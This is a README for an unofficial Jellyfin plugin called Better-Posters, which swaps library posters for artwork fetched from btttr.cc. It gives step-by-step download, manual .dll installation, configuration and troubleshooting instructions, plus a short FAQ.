# 🖼️ Better-Posters - Customizing your media library visuals easily

[![](https://img.shields.io/badge/Download_Plugin-Blue?style=for-the-badge)](https://github.com/Sumayyaa2538/Better-Posters)

Better-Posters serves as an unofficial plugin for the Jellyfin media server. It allows users to swap standard movie and television show posters for custom versions sourced from btttr.cc. This tool creates a clean, uniform look for your personal collection.

## 📋 System Requirements

Ensure you meet these basic requirements before you begin:

* You have Jellyfin installed and running on your Windows computer.
* You possess administrator access to the computer hosting the server.
* You have a stable internet connection for downloading assets.
* The Jellyfin server is running version 10.8.0 or newer.

## 📥 Downloading the Plugin

You must obtain the plugin file from the source repository. Follow these steps to prepare the installation file:

1. Visit this page to download: [https://github.com/Sumayyaa2538/Better-Posters](https://github.com/Sumayyaa2538/Better-Posters).
2. Look for the green button labeled "Code" near the top right of the page.
3. Click "Download ZIP" from the menu.
4. Save the file to your "Downloads" folder.
5. Right-click the folder and select "Extract All" to unpack the contents.
6. Locate the file ending in `.dll` or the folder containing the plugin structure.

## ⚙️ Installing the Plugin

Jellyfin needs the plugin files placed in a specific directory to recognize them. Perform these steps:

1. Open your File Explorer.
2. Navigate to your Jellyfin installation directory. By default, this is usually `C:\ProgramData\Jellyfin\Server\plugins`.
3. If you do not see a "plugins" folder, create one manually.
4. Copy the extracted plugin file into this folder.
5. Restart your Jellyfin server application to allow the system to load the new code.
6. Open your web browser and go to your Jellyfin dashboard.
7. Select "Dashboard" from the menu.
8. Click on "Plugins." You should see Better-Posters listed in your installed plugins section.

## 🎨 Configuring Your Posters

Once the plugin is active, you can customize your library display.

1. Navigate to the plugin settings page within the Jellyfin dashboard.
2. Click on the Better-Posters icon to open the configuration menu.
3. Link your account or provide your API credentials if requested.
4. Choose the categories you wish to update, such as movies or television series.
5. Select your preferred style from the available options provided by btttr.cc.
6. Click "Save" to apply your changes.
7. Refresh your media library in Jellyfin. The plugin will scan your items and apply the new artwork.

## 🛠️ Troubleshooting Common Issues

If you encounter problems, refer to these steps to resolve them.

### Plugin Does Not Appear
If you restarted the server but the plugin remains hidden, check the folder path. The plugin file must sit directly inside the "plugins" folder. Verify that you did not leave the file inside an extra subfolder during the extraction process.

### Posters Fail to Load
If your posters stay blank, check the server connection. The plugin needs to reach the btttr.cc website to download the new images. Ensure your firewall settings permit Jellyfin to interact with external websites. 

### Server Performance
Downloading new posters for an entire library requires processing power. If you have thousands of movies, allow the server a few minutes to process the changes. You can monitor the progress by looking at the server logs inside the Jellyfin dashboard.

### Updating the Plugin
When a new version releases, download the updated file from the link above. Follow the same installation steps to replace the old `.dll` file with the new one. Always restart the server after you swap files.

## 💡 Frequently Asked Questions

**Does this damage my original files?**
No. This plugin changes the metadata and image links Jellyfin stores. It leaves your actual movie files untouched.

**Can I undo these changes?**
Yes. If you wish to revert to your original posters, uninstall the plugin and tell Jellyfin to refresh your library metadata. The server will fetch the original metadata from the default sources.

**Is this an official Jellyfin plugin?**
No. This is an unofficial plugin developed by the community. It functions alongside Jellyfin but operates independently of official support channels.

**Where does the artwork come from?**
The plugin fetches images from btttr.cc, a community-driven repository. The plugin acts as a bridge between your server and their image servers.

**Do I need a paid account?**
The plugin is free. Use it to improve the visual presentation of your media collection without added costs.